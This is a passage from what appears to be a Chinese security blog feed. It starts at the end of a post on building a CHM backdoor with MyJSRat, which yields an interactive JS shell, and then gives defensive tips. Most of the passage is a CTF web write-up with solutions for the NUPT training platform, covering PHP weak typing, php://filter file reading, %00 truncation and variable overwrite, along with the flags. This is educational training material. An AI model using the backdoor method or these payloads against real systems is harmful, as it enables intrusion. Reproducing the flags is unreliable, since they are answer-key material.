<p>原理一样,只不过这次是用python脚本,主要针对想自动批量上线的需求[适合群发]<br><a href="https://github.com/Ridter/MyJSRat" target="_blank" rel="noopener" title="MyJSRat.py">https://github.com/Ridter/MyJSRat</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python MyJSRat.py -i 192.168.1.101 -p 3333</span><br></pre></td></tr></table></figure>
<p>访问 <a href="http://192.168.72.23:3333/wtf" target="_blank" rel="noopener">http://192.168.72.23:3333/wtf</a> 获取攻击代码如下：<br><img src="/posts/13577/5.png" alt></p>
<p>将攻击代码写入html文件<br><img src="/posts/13577/6.png" alt></p>
<p>编译以后运行，可以成功获取JS交互shell<br><img src="/posts/13577/8.png" alt></p>
<h2 id="0x05-针对chm的后门的有效防御"><a href="#0x05-针对chm的后门的有效防御" class="headerlink" title="0x05 针对chm的后门的有效防御"></a>0x05 针对chm的后门的有效防御</h2><ol>
<li>利用windows自带的hh命令,便可以轻松反编译chm源文件,通过看源文件中的代码很容易就能发现此类后门<br>具体命令格式如下: # hh -decompile C:\Users\scan\Desktop\new C:\Users\scan\Desktop\works\source.chm</li>
<li>严禁随意打开别人发过来的各种chm文件,很多人就是通过这种方式,把程序员经常用到的一些开发手册[通常都是chm文件]加工成后门后往各个站点里发,以此发来大批量挂马收集肉鸡</li>
</ol>
]]></content>
  </entry>
  <entry>
    <title>反弹shell备忘录</title>
    <url>/posts/40232.html</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="" />
    <label for="hbePass">输入密码，查看文章！</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="f96383e8aed4fab22af6cb6e518173b70e80d9b42f9af11f035f1be479872b10"></script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>备忘录</category>
      </categories>
      <tags>
        <tag>shell</tag>
      </tags>
  </entry>
  <entry>
    <title>南京邮电大学网络攻防训练平台</title>
    <url>/posts/35909.html</url>
    <content><![CDATA[<p><img src="http://pp64r48ul.bkt.clouddn.com/%E5%8D%97%E9%82%AE1.png" alt></p>
<a id="more"></a>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>刚刚接触CTF不久，还是决定先从web开始，于是就开始了自己的南邮刷题之旅，谨以此记录自己的学习过程，总结解题方法，勉励自己坚持学习！</p>
<h2 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h2><h3 id="题目链接：http-chinalover-sinaapp-com-web1"><a href="#题目链接：http-chinalover-sinaapp-com-web1" class="headerlink" title="题目链接：http://chinalover.sinaapp.com/web1/"></a>题目链接：<a href="http://chinalover.sinaapp.com/web1/" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web1/</a></h3><h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>单个页面查看源代码。</p>
<h3 id="解题方法"><a href="#解题方法" class="headerlink" title="解题方法"></a>解题方法</h3><p><img src="http://pp64r48ul.bkt.clouddn.com/%E5%8D%97%E9%82%AE2.png" alt></p>
<h3 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h3><p><code>nctf{flag_admiaanaaaaaaaaaaa}</code></p>
<h2 id="md5-collision"><a href="#md5-collision" class="headerlink" title="md5 collision"></a>md5 collision</h2><h3 id="题目链接：http-chinalover-sinaapp-com-web19"><a href="#题目链接：http-chinalover-sinaapp-com-web19" class="headerlink" title="题目链接：http://chinalover.sinaapp.com/web19/"></a>题目链接：<a href="http://chinalover.sinaapp.com/web19/" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web19/</a></h3><h3 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h3><p>PHP代码阅读：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$md51 &#x3D; md5(&#39;QNKCDZO&#39;);</span><br><span class="line">$a &#x3D; @$_GET[&#39;a&#39;];</span><br><span class="line">$md52 &#x3D; @md5($a);</span><br><span class="line">if(isset($a))&#123;</span><br><span class="line">if ($a !&#x3D; &#39;QNKCDZO&#39; &amp;&amp; $md51 &#x3D;&#x3D; $md52) &#123;</span><br><span class="line">    echo &quot;nctf&#123;*****************&#125;&quot;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    echo &quot;false!!!&quot;;</span><br><span class="line">&#125;&#125;</span><br><span class="line">else&#123;echo &quot;please input a&quot;;&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>核心代码：<br><code>$a != &#39;QNKCDZO&#39; &amp;&amp; $md51 == $md52</code><br>主要是利用了 PHP 弱类型语言的松散比较符的缺陷。<br>从源码中可以得输入一个 a 的参数的变量，a 首先不等于QNKCDZO并且 a 得 md5 值必须等于QNKCDZO加密后的 md5 值。</p>
<p>乍一看好像不可能存在这样的值，但是这里QNKCDZO加密后的 md5 值为0e830400451993494058024219903391<br>这里是0e开头的，在进行等于比较的时候，PHP 把它当作科学计数法，0 的无论多少次方都是零。 </p>
<p>所以这里利用上面的弱类型的比较的缺陷来进行解题。</p>
<h3 id="解题方法-1"><a href="#解题方法-1" class="headerlink" title="解题方法"></a>解题方法</h3><p><img src="http://pp64r48ul.bkt.clouddn.com/%E5%8D%97%E9%82%AE3.jpg" alt="在这里插入图片描述"></p>
<h3 id="flag-1"><a href="#flag-1" class="headerlink" title="flag"></a>flag</h3><p><code>nctf{md5_collision_is_easy}</code></p>
<h3 id="姿势补充："><a href="#姿势补充：" class="headerlink" title="姿势补充："></a>姿势补充：</h3><p>字符串加密后 md5 为 0exxxx 的字符串 (x 必须是 10 进制数字) 列表</p>
<table>
<thead>
<tr>
<th align="center">字符串</th>
<th align="center">MD5</th>
</tr>
</thead>
<tbody><tr>
<td align="center">QNKCDZO</td>
<td align="center">0e830400451993494058024219903391</td>
</tr>
<tr>
<td align="center">240610708</td>
<td align="center">0e462097431906509019562988736854</td>
</tr>
<tr>
<td align="center">aabg7XSs</td>
<td align="center">0e087386482136013740957780965295</td>
</tr>
<tr>
<td align="center">aabC9RqS</td>
<td align="center">0e041022518165728065344349536299</td>
</tr>
<tr>
<td align="center">s878926199a</td>
<td align="center">0e545993274517709034328855841020</td>
</tr>
<tr>
<td align="center">s155964671a</td>
<td align="center">0e342768416822451524974117254469</td>
</tr>
<tr>
<td align="center">s214587387a</td>
<td align="center">0e848240448830537924465865611904</td>
</tr>
<tr>
<td align="center">s214587387a</td>
<td align="center">0e848240448830537924465865611904</td>
</tr>
<tr>
<td align="center">s878926199a</td>
<td align="center">0e545993274517709034328855841020</td>
</tr>
<tr>
<td align="center">s1091221200a</td>
<td align="center">0e940624217856561557816327384675</td>
</tr>
<tr>
<td align="center">s1885207154a</td>
<td align="center">0e509367213418206700842008763514</td>
</tr>
</tbody></table>
<h2 id="签到2"><a href="#签到2" class="headerlink" title="签到2"></a>签到2</h2><h3 id="题目链接：http-teamxlc-sinaapp-com-web1-02298884f0724c04293b4d8c0178615e-index-php"><a href="#题目链接：http-teamxlc-sinaapp-com-web1-02298884f0724c04293b4d8c0178615e-index-php" class="headerlink" title="题目链接：http://teamxlc.sinaapp.com/web1/02298884f0724c04293b4d8c0178615e/index.php"></a>题目链接：<a href="http://teamxlc.sinaapp.com/web1/02298884f0724c04293b4d8c0178615e/index.php" target="_blank" rel="noopener">http://teamxlc.sinaapp.com/web1/02298884f0724c04293b4d8c0178615e/index.php</a></h3><h3 id="解题思路-2"><a href="#解题思路-2" class="headerlink" title="解题思路"></a>解题思路</h3><p><img src="http://pp64r48ul.bkt.clouddn.com/%E5%8D%97%E9%82%AE4.jpg" alt="在这里插入图片描述"><br>题中提示输入口令：<code>zhimakaimen</code>,然而输入之后并没有什么卵用。</p>
<h3 id="解题方法-2"><a href="#解题方法-2" class="headerlink" title="解题方法"></a>解题方法</h3><h4 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h4><p>查看页面源代码，<br><img src="http://pp64r48ul.bkt.clouddn.com/%E5%8D%97%E9%82%AE5.jpg" alt="在这里插入图片描述"><br>发现输入框中允许输入的字符串最大长度为10，而<code>zhimakaimen</code>11个字符，于是果断F12修改<code>maxlength=11</code>,再次输入，OK了。<br><img src="http://pp64r48ul.bkt.clouddn.com/%E5%8D%97%E9%82%AE6.jpg" alt="在这里插入图片描述"></p>
<h4 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h4><p>利用Burpsuite抓包<br><img src="http://pp64r48ul.bkt.clouddn.com/%E5%8D%97%E9%82%AE7.jpg" alt="在这里插入图片描述"><br>修改text1=zhimakaimen，然后GO即可<br><img src="http://pp64r48ul.bkt.clouddn.com/%E5%8D%97%E9%82%AE8.jpg" alt="在这里插入图片描述"></p>
<h3 id="flag-2"><a href="#flag-2" class="headerlink" title="flag"></a>flag</h3><p><code>nctf{follow_me_to_exploit}</code></p>
<h2 id="这题不是WEB"><a href="#这题不是WEB" class="headerlink" title="这题不是WEB"></a>这题不是WEB</h2><h3 id="题目链接：http-chinalover-sinaapp-com-web2-index-html"><a href="#题目链接：http-chinalover-sinaapp-com-web2-index-html" class="headerlink" title="题目链接：http://chinalover.sinaapp.com/web2/index.html"></a>题目链接：<a href="http://chinalover.sinaapp.com/web2/index.html" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web2/index.html</a></h3><h3 id="解题思路-3"><a href="#解题思路-3" class="headerlink" title="解题思路"></a>解题思路</h3><p>一个猫的图片，看来搞信安的很多人都喜欢猫呀。加上题目提示: 这不是一个 Web 题目，所以这一题重点在这张图片上。</p>
<h3 id="解题方法-3"><a href="#解题方法-3" class="headerlink" title="解题方法"></a>解题方法</h3><p>将图片保存下来，修改格式为txt，打开查找即可。</p>
<h3 id="flag-3"><a href="#flag-3" class="headerlink" title="flag"></a>flag</h3><p><code>nctf{photo_can_also_hid3_msg}</code></p>
<h2 id="层层递进"><a href="#层层递进" class="headerlink" title="层层递进"></a>层层递进</h2><h3 id="题目链接：http-chinalover-sinaapp-com-web3"><a href="#题目链接：http-chinalover-sinaapp-com-web3" class="headerlink" title="题目链接：http://chinalover.sinaapp.com/web3/"></a>题目链接：<a href="http://chinalover.sinaapp.com/web3/" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web3/</a></h3><h3 id="解题思路-4"><a href="#解题思路-4" class="headerlink" title="解题思路"></a>解题思路</h3><p>这一题 一上来我是懵逼的，搜索关键词找了网上的 Write-up 才明白题目想表达的意思。<br>网站源码一看主要就使用了<code>&lt;iframe&gt;</code>标签，<code>iframe</code>元素会创建包含另外一个文档的内联框架（即行内框架）。好像有点层层递进的感觉，所以这里重点是<code>&lt;iframe&gt;</code>标签内的内容。 </p>
<h3 id="解题方法-4"><a href="#解题方法-4" class="headerlink" title="解题方法"></a>解题方法</h3><p>直接查看网页源代码，有一个<code>SO.html</code>,点击，重复几次，最后出现<code>404.html</code>，继续，出现下图：<br><img src="http://pp64r48ul.bkt.clouddn.com/%E5%8D%97%E9%82%AE9.jpg" alt="在这里插入图片描述"><br>说实话，不仔细看是看不出来的。(内心是崩溃的）</p>
<h3 id="flag-4"><a href="#flag-4" class="headerlink" title="flag"></a>flag</h3><p><code>nctf{this_is_a_fl4g}</code></p>
<h2 id="AAencode"><a href="#AAencode" class="headerlink" title="AAencode"></a>AAencode</h2><h3 id="题目链接：http-chinalover-sinaapp-com-web20-aaencode-txt"><a href="#题目链接：http-chinalover-sinaapp-com-web20-aaencode-txt" class="headerlink" title="题目链接：http://chinalover.sinaapp.com/web20/aaencode.txt"></a>题目链接：<a href="http://chinalover.sinaapp.com/web20/aaencode.txt" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web20/aaencode.txt</a></h3><h3 id="解题思路-5"><a href="#解题思路-5" class="headerlink" title="解题思路"></a>解题思路</h3><p>抓包看返回包</p>
<h3 id="解题方法-5"><a href="#解题方法-5" class="headerlink" title="解题方法"></a>解题方法</h3><h3 id="flag-5"><a href="#flag-5" class="headerlink" title="flag"></a>flag</h3><p><code>nctf{javascript_aaencode}</code></p>
<h2 id="单身二十年"><a href="#单身二十年" class="headerlink" title="单身二十年"></a>单身二十年</h2><h3 id="题目链接：http-chinalover-sinaapp-com-web8"><a href="#题目链接：http-chinalover-sinaapp-com-web8" class="headerlink" title="题目链接：http://chinalover.sinaapp.com/web8/"></a>题目链接：<a href="http://chinalover.sinaapp.com/web8/" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web8/</a></h3><h3 id="解题思路-6"><a href="#解题思路-6" class="headerlink" title="解题思路"></a>解题思路</h3><p>抓包看返回包</p>
<h3 id="解题方法-6"><a href="#解题方法-6" class="headerlink" title="解题方法"></a>解题方法</h3><p>方法一：<br><img src="http://pp64r48ul.bkt.clouddn.com/%E5%8D%97%E9%82%AE10.jpg" alt="在这里插入图片描述"><br>方法二：<br>查看页面源代码<br><img src="http://pp64r48ul.bkt.clouddn.com/%E5%8D%97%E9%82%AE11.jpg" alt="在这里插入图片描述"><br>发现里面包含一个<code>search_key.php</code>文件，于是构造payload：<br><code>/search_key.php</code>,得到flag<br><img src="http://pp64r48ul.bkt.clouddn.com/%E5%8D%97%E9%82%AE12.jpg" alt="在这里插入图片描述"></p>
<h3 id="flag-6"><a href="#flag-6" class="headerlink" title="flag"></a>flag</h3><p><code>nctf{yougotit_script_now}</code></p>
<h2 id="你从哪里来"><a href="#你从哪里来" class="headerlink" title="你从哪里来"></a>你从哪里来</h2><h3 id="题目链接：http-chinalover-sinaapp-com-web22"><a href="#题目链接：http-chinalover-sinaapp-com-web22" class="headerlink" title="题目链接：http://chinalover.sinaapp.com/web22/"></a>题目链接：<a href="http://chinalover.sinaapp.com/web22/" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web22/</a></h3><h3 id="解题思路-7"><a href="#解题思路-7" class="headerlink" title="解题思路"></a>解题思路</h3><p>http 头使用referer伪造</p>
<h3 id="解题方法-7"><a href="#解题方法-7" class="headerlink" title="解题方法"></a>解题方法</h3><p>BP 抓包手动添加Google域名的referer<br><img src="http://pp64r48ul.bkt.clouddn.com/%E5%8D%97%E9%82%AE13.jpg" alt="在这里插入图片描述"><br>题目有问题挂了,解题思路就是这样。</p>
<h3 id="flag-7"><a href="#flag-7" class="headerlink" title="flag"></a>flag</h3><p>但网上还是能找到flag的：<br><code>nctf{http_referer}</code></p>
<h2 id="php-decode"><a href="#php-decode" class="headerlink" title="php decode"></a>php decode</h2><h3 id="题目链接："><a href="#题目链接：" class="headerlink" title="题目链接："></a>题目链接：</h3><h3 id="解题思路-8"><a href="#解题思路-8" class="headerlink" title="解题思路"></a>解题思路</h3><p>PHP代码阅读：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function CLsI($ZzvSWE) &#123;    &#x2F;&#x2F; 定义一个 CLsI 函数，接受 ZzvSWE 的变量</span><br><span class="line">    $ZzvSWE &#x3D; gzinflate(base64_decode($ZzvSWE));  &#x2F;&#x2F;ZzvSWE变量被base64解密后使用gzinflate加密</span><br><span class="line"></span><br><span class="line">    for ($i &#x3D; 0; $i &lt; strlen($ZzvSWE); $i++) &#123;</span><br><span class="line">        $ZzvSWE[$i] &#x3D; chr(ord($ZzvSWE[$i]) - 1);</span><br><span class="line">        &#x2F;&#x2F;遍历ZzvSWE变量 转换为变量的每一位的ASCII值-1的字符</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return $ZzvSWE;</span><br><span class="line">&#125;eval(CLsI(&quot;+7DnQGFmYVZ+eoGmlg0fd3puUoZ1fkppek1GdVZhQnJSSZq5aUImGNQBAA&#x3D;&#x3D;&quot;));</span><br><span class="line">?&gt; &#x2F;&#x2F;这里的eval函数问题很大</span><br></pre></td></tr></table></figure>
<h3 id="解题方法-8"><a href="#解题方法-8" class="headerlink" title="解题方法"></a>解题方法</h3><p>代码整体意思不难理解，遍历字符串中的每一个字母，然后使用Base64+Gzinflate加密，最后转换为 ASCII 码的值 - 1，再转换为字符串。所以尝试运行一下代码，发现报错，这里报错是因eval函数的问题。<br>eval 函数:</p>
<ol>
<li>eval() 函数把字符串按照 PHP 代码来执行</li>
<li>该字符串必须是合法的 PHP 代码，且必须以分号结尾</li>
<li>如果没有在代码字符串中调用 return 语句，则返回 NULL</li>
<li>如果代码中存在解析错误，则 eval() 函数返回 false<br><code>eval</code>函数一般我们在一句话木马中经常见到，结合这个就很容易理解了。<br>解决代码运行报错就是直接将<code>eval</code>修改为<code>echo</code>直接将结果输出来:<br><img src="http://pp64r48ul.bkt.clouddn.com/%E5%8D%97%E9%82%AE14.jpg" alt="在这里插入图片描述"></li>
</ol>
<h3 id="flag-8"><a href="#flag-8" class="headerlink" title="flag"></a>flag</h3><p><code>nctf{gzip_base64_hhhhhh}</code></p>
<h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><h3 id="题目链接：http-4-chinalover-sinaapp-com-web7-index-php"><a href="#题目链接：http-4-chinalover-sinaapp-com-web7-index-php" class="headerlink" title="题目链接：http://4.chinalover.sinaapp.com/web7/index.php"></a>题目链接：<a href="http://4.chinalover.sinaapp.com/web7/index.php" target="_blank" rel="noopener">http://4.chinalover.sinaapp.com/web7/index.php</a></h3><h3 id="解题思路-9"><a href="#解题思路-9" class="headerlink" title="解题思路"></a>解题思路</h3><p>给了乌云知识库的参考链接，阅读了一下本文主要是利用 php 流 filter 来进行文件读取。 关于 PHP 文件流后期单独来总结.</p>
<h3 id="解题方法-9"><a href="#解题方法-9" class="headerlink" title="解题方法"></a>解题方法</h3><p>使用PHP的filter协议读取index.php，即访问 <code>http://4.chinalover.sinaapp.com/web7/index.php?file=php://filter/convert.base64-encode/resource=index.php</code> ，将得到的字符串base64解码。<br><img src="http://pp64r48ul.bkt.clouddn.com/%E5%8D%97%E9%82%AE15.jpg" alt="在这里插入图片描述"></p>
<h3 id="flag-9"><a href="#flag-9" class="headerlink" title="flag"></a>flag</h3><p><code>nctf{edulcni_elif_lacol_si_siht}</code></p>
<h2 id="单身一百年也没用"><a href="#单身一百年也没用" class="headerlink" title="单身一百年也没用"></a>单身一百年也没用</h2><h3 id="题目链接：http-chinalover-sinaapp-com-web9"><a href="#题目链接：http-chinalover-sinaapp-com-web9" class="headerlink" title="题目链接：http://chinalover.sinaapp.com/web9/"></a>题目链接：<a href="http://chinalover.sinaapp.com/web9/" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web9/</a></h3><h3 id="解题思路-10"><a href="#解题思路-10" class="headerlink" title="解题思路"></a>解题思路</h3><p>抓包看返回包</p>
<h3 id="解题方法-10"><a href="#解题方法-10" class="headerlink" title="解题方法"></a>解题方法</h3><p>BP抓包，flag藏在响应头里<br><img src="http://pp64r48ul.bkt.clouddn.com/%E5%8D%97%E9%82%AE16.jpg" alt="在这里插入图片描述"></p>
<h3 id="flag-10"><a href="#flag-10" class="headerlink" title="flag"></a>flag</h3><p><code>nctf{this_is_302_redirect}</code></p>
<h2 id="COOKIE"><a href="#COOKIE" class="headerlink" title="COOKIE"></a>COOKIE</h2><h3 id="题目链接：http-chinalover-sinaapp-com-web10-index-php"><a href="#题目链接：http-chinalover-sinaapp-com-web10-index-php" class="headerlink" title="题目链接：http://chinalover.sinaapp.com/web10/index.php"></a>题目链接：<a href="http://chinalover.sinaapp.com/web10/index.php" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web10/index.php</a></h3><h3 id="解题思路-11"><a href="#解题思路-11" class="headerlink" title="解题思路"></a>解题思路</h3><p>BP抓包看返回包</p>
<h3 id="解题方法-11"><a href="#解题方法-11" class="headerlink" title="解题方法"></a>解题方法</h3><p><img src="http://pp64r48ul.bkt.clouddn.com/%E5%8D%97%E9%82%AE17.jpg" alt="在这里插入图片描述"><br>得到flag<br><img src="http://pp64r48ul.bkt.clouddn.com/%E5%8D%97%E9%82%AE18.jpg" alt="在这里插入图片描述"></p>
<h3 id="flag-11"><a href="#flag-11" class="headerlink" title="flag"></a>flag</h3><p><code>nctf{cookie_is_different_from_session}</code></p>
<h2 id="MYSQL"><a href="#MYSQL" class="headerlink" title="MYSQL"></a>MYSQL</h2><h3 id="题目链接：http-chinalover-sinaapp-com-web11"><a href="#题目链接：http-chinalover-sinaapp-com-web11" class="headerlink" title="题目链接：http://chinalover.sinaapp.com/web11/"></a>题目链接：<a href="http://chinalover.sinaapp.com/web11/" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web11/</a></h3><h3 id="解题思路-12"><a href="#解题思路-12" class="headerlink" title="解题思路"></a>解题思路</h3><p>根据提示找到 robots.txt 文件下载下来然后阅读 PHP 代码:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if($_GET[id]) &#123;</span><br><span class="line">   mysql_connect(SAE_MYSQL_HOST_M . &#39;:&#39; . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);</span><br><span class="line">  mysql_select_db(SAE_MYSQL_DB);</span><br><span class="line">  $id &#x3D; intval($_GET[id]);</span><br><span class="line">  $query &#x3D; @mysql_fetch_array(mysql_query(&quot;select content from ctf2 where id&#x3D;&#39;$id&#39;&quot;));</span><br><span class="line">  if ($_GET[id]&#x3D;&#x3D;1024) &#123;</span><br><span class="line">      echo &quot;&lt;p&gt;no! try again&lt;&#x2F;p&gt;&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">  else&#123;</span><br><span class="line">    echo($query[content]);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>说明要向sql.php提交一个id，使得<code>intval($_GET[id])为1024</code>而<code>$_GET[id]==1024</code>为假。<code>intval()</code> 是整型转换函数，会强制转换为整形。</p>
<h3 id="解题方法-12"><a href="#解题方法-12" class="headerlink" title="解题方法"></a>解题方法</h3><p>代码中提示了不可以直接输入id=1024, 这里得想办法来绕过才可以。可以令<code>id=1024.xxx</code>等之类的小数，也可以用科学计数法。<br><img src="http://pp64r48ul.bkt.clouddn.com/%E5%8D%97%E9%82%AE19.jpg" alt="在这里插入图片描述"></p>
<h3 id="flag-12"><a href="#flag-12" class="headerlink" title="flag"></a>flag</h3><p><code>nctf{query_in_mysql}</code></p>
<h2 id="sql-injection-3"><a href="#sql-injection-3" class="headerlink" title="sql injection 3"></a>sql injection 3</h2><h3 id="题目链接：http-chinalover-sinaapp-com-SQL-GBK-index-php-id-1"><a href="#题目链接：http-chinalover-sinaapp-com-SQL-GBK-index-php-id-1" class="headerlink" title="题目链接：http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1"></a>题目链接：<a href="http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1" target="_blank" rel="noopener">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1</a></h3><h3 id="解题思路-13"><a href="#解题思路-13" class="headerlink" title="解题思路"></a>解题思路</h3><h3 id="解题方法-13"><a href="#解题方法-13" class="headerlink" title="解题方法"></a>解题方法</h3><h3 id="flag-13"><a href="#flag-13" class="headerlink" title="flag"></a>flag</h3><p><code>nctf{gbk_3sqli}</code></p>
<h2 id="x00"><a href="#x00" class="headerlink" title="/x00"></a>/x00</h2><h3 id="题目链接：http-teamxlc-sinaapp-com-web4-f5a14f5e6e3453b78cd73899bad98d53-index-php"><a href="#题目链接：http-teamxlc-sinaapp-com-web4-f5a14f5e6e3453b78cd73899bad98d53-index-php" class="headerlink" title="题目链接：http://teamxlc.sinaapp.com/web4/f5a14f5e6e3453b78cd73899bad98d53/index.php"></a>题目链接：<a href="http://teamxlc.sinaapp.com/web4/f5a14f5e6e3453b78cd73899bad98d53/index.php" target="_blank" rel="noopener">http://teamxlc.sinaapp.com/web4/f5a14f5e6e3453b78cd73899bad98d53/index.php</a></h3><h3 id="解题思路-14"><a href="#解题思路-14" class="headerlink" title="解题思路"></a>解题思路</h3><p>阅读源代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if (isset ($_GET[&#39;nctf&#39;])) &#123;</span><br><span class="line">       if (@ereg (&quot;^[1-9]+$&quot;, $_GET[&#39;nctf&#39;]) &#x3D;&#x3D;&#x3D; FALSE)</span><br><span class="line">           echo &#39;必须输入数字才行&#39;;</span><br><span class="line">       else if (strpos ($_GET[&#39;nctf&#39;], &#39;#biubiubiu&#39;) !&#x3D;&#x3D; FALSE)   </span><br><span class="line">           die(&#39;Flag: &#39;.$flag);</span><br><span class="line">       else</span><br><span class="line">           echo &#39;骚年，继续努力吧啊~&#39;;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<p>nctf 的值是数字且必须含有<code>#biubiubiu</code>,根据提示查到资料ereg会把null视为字符串的结束，从而被%00截断，而strpos则可以越过%00，所以提交<code>nctf=1%00%23biubiubiu</code>即可。</p>
<h3 id="解题方法-14"><a href="#解题方法-14" class="headerlink" title="解题方法"></a>解题方法</h3><p><img src="http://pp64r48ul.bkt.clouddn.com/%E5%8D%97%E9%82%AE20.jpg" alt="在这里插入图片描述"></p>
<p>注意：<code>#biubiubiu</code>中的<code>#</code>URL编码为<code>%23</code></p>
<h3 id="flag-14"><a href="#flag-14" class="headerlink" title="flag"></a>flag</h3><p><code>nctf{use_00_to_jieduan}</code></p>
<h2 id="bypass-again"><a href="#bypass-again" class="headerlink" title="bypass again"></a>bypass again</h2><h3 id="题目链接：http-chinalover-sinaapp-com-web17-index-php"><a href="#题目链接：http-chinalover-sinaapp-com-web17-index-php" class="headerlink" title="题目链接：http://chinalover.sinaapp.com/web17/index.php"></a>题目链接：<a href="http://chinalover.sinaapp.com/web17/index.php" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web17/index.php</a></h3><h3 id="解题思路-15"><a href="#解题思路-15" class="headerlink" title="解题思路"></a>解题思路</h3><p>代码阅读；</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if (isset($_GET[&#39;a&#39;]) and isset($_GET[&#39;b&#39;])) </span><br><span class="line">&#123;  &#x2F;&#x2F;get方式接受a和b变量</span><br><span class="line">    if ($_GET[&#39;a&#39;] !&#x3D; $_GET[&#39;b&#39;])     &#x2F;&#x2F;a 不等于 b</span><br><span class="line">    if (md5($_GET[&#39;a&#39;]) &#x3D;&#x3D; md5($_GET[&#39;b&#39;]))  &#x2F;&#x2F;a的md5值等于b的md5值</span><br><span class="line">        die(&#39;Flag: &#39;.$flag);</span><br><span class="line">    else</span><br><span class="line">        print &#39;Wrong.&#39;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这一题考察了 PHP 弱类型语言的特性.源码要求提交两个不相等的值使他们的md5值严格相等。md5()函数要求接收一个字符串，若传递进去一个数组，则会返回null，即<code>var_dump(md5(array(2))===null);值为bool(true)</code>。</p>
<h3 id="解题方法-15"><a href="#解题方法-15" class="headerlink" title="解题方法"></a>解题方法</h3><p>因此向$_GET数组传入两个名为a、b的不相等的数组，从而导致md5()均返回空，于是得到flag.</p>
<h3 id="flag-15"><a href="#flag-15" class="headerlink" title="flag"></a>flag</h3><p><code>nctf{php_is_so_cool}</code></p>
<h2 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h2><h3 id="题目链接：http-chinalover-sinaapp-com-web18-index-php"><a href="#题目链接：http-chinalover-sinaapp-com-web18-index-php" class="headerlink" title="题目链接：http://chinalover.sinaapp.com/web18/index.php"></a>题目链接：<a href="http://chinalover.sinaapp.com/web18/index.php" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web18/index.php</a></h3><h3 id="解题思路-16"><a href="#解题思路-16" class="headerlink" title="解题思路"></a>解题思路</h3><p>source.php核心代码如下:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">  if ($_SERVER[&quot;REQUEST_METHOD&quot;] &#x3D;&#x3D; &quot;POST&quot;) </span><br><span class="line">  &#123;</span><br><span class="line">        extract($_POST);</span><br><span class="line">        if ($pass &#x3D;&#x3D; $thepassword_123)</span><br><span class="line">                echo $theflag;</span><br><span class="line">  &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>关于变量覆盖请看我的另一篇博文：<a href="https://l1395851238.github.io/2018/11/18/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/#more" target="_blank" rel="noopener">https://l1395851238.github.io/2018/11/18/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/#more</a></p>
<h3 id="解题方法-16"><a href="#解题方法-16" class="headerlink" title="解题方法"></a>解题方法</h3><p><img src="http://pp64r48ul.bkt.clouddn.com/%E5%8D%97%E9%82%AE21.jpg" alt="在这里插入图片描述"></p>
<h3 id="flag-16"><a href="#flag-16" class="headerlink" title="flag"></a>flag</h3><p><code>nctf{bian_liang_fu_gai!}</code></p>
